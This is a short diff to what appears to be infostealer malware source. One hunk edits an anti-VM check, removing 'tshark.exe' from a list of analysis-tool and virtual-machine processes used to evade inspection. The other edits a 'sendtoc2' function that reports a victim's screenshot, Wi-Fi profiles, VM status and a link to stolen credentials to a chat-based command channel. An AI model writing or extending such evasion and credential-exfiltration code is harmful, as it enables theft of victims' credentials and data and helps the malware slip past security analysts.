@@ -617,7 +617,6 @@ def anti_vm():
         'vmwaretray.exe', 
         'ida64.exe', 
         'ollydbg.exe', 
-        'tshark.exe',
         'pestudio.exe', 
         'vgauthservice.exe', 
         'vmacthlp.exe', 
@@ -1646,7 +1645,7 @@ def sendtoc2(file):
 📷 Screenshot: {"Yes" if ss_success == 1 else "No"}
 📶 Wi-Fi Networks: {str(wifiprofiles)}
 🧪 VM/Debugger: {'Yes' if is_vm else 'No'}
-🔗 Credentials: ||{download}||
+🔗 Credentials: {download}
         '''
         payload = {
             'chat_id': chat_id,
